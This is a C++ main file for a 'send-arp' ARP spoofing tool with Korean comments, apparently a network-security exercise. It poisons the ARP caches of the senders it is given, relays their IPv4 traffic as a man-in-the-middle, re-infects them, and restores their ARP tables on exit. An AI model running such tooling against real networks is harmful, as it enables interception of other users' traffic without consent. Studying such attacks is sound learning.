#include <cstdio>
#include <cstdlib>
#include <string>
#include <vector>
#include <csignal>
#include "session.h"
#include "interface_utils.h"
#include "arp_utils.h"
#include "relay.h"
#include <csignal>


static void usage() {
    printf(
        "syntax: send-arp "
        "<interface> <sender ip> <target ip> "
        "[<sender ip> <target ip> ...]\n"
        );

    printf(
        "sample: send-arp "
        "wlan0 192.168.0.2 192.168.0.1\n"
        );
}

// Ctrl+C 입력 시 패킷 수신 루프의 종료만 요청한다.
//
// 시그널 처리 함수 안에서는 패킷 전송이나 pcap_close()를
// 직접 수행하지 않는다.
static void handleSignal(int signalNumber) {
    if (signalNumber == SIGINT) {
        requestPacketLoopStop();
    }
}


int main(int argc, char* argv[]) {
    // 1. 명령행 인자 검사
    if (!isValidSessionArguments(argc)) {
        usage();
        return EXIT_FAILURE;
    }

    const char* interfaceName = argv[1];

    std::vector<Session> sessions =
        makeSessions(argc, argv);
    std::signal(SIGINT, handleSignal);



    // 2. Attacker의 MAC/IP 주소 조회
    Mac aMac;
    Ip aIp;

    if (
        !getInterfaceMac(interfaceName, aMac) ||
        !getInterfaceIp(interfaceName, aIp)
        ) {
        fprintf(
            stderr,
            "Attacker 인터페이스 정보 조회 실패\n"
            );

        return EXIT_FAILURE;
    }

    printf(
        "Attacker MAC: %s\n",
        std::string(aMac).c_str()
        );

    printf(
        "Attacker IP: %s\n",
        std::string(aIp).c_str()
        );

    // 3. pcap 패킷 송수신 준비
    pcap_t* pcap =
        openPacketCapture(interfaceName);

    if (pcap == nullptr) {
        return EXIT_FAILURE;
    }

    // 4. 모든 Session의 Sender/Target MAC 조회
    if (!resolveAllSessionMacs(
            pcap,
            aMac,
            aIp,
            sessions
            )) {
        pcap_close(pcap);
        return EXIT_FAILURE;
    }

    // 5. 모든 Sender 최초 감염
    if (!infectAllSessions(
            pcap,
            aMac,
            sessions
            )) {
        pcap_close(pcap);
        return EXIT_FAILURE;
    }

    // 6. IPv4 지속 Relay 및 ARP 재감염
    bool loopSuccess =
        runPacketLoop(
            pcap,
            aMac,
            sessions
            );

    printf(
        "\n프로그램 종료 요청: "
        "Sender의 ARP Table을 복구합니다.\n"
        );

    // 7. 모든 Sender의 ARP Table 복구
    bool recoverySuccess =
        recoverAllSessions(
            pcap,
            sessions
            );

    pcap_close(pcap);

    if (!loopSuccess || !recoverySuccess) {
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}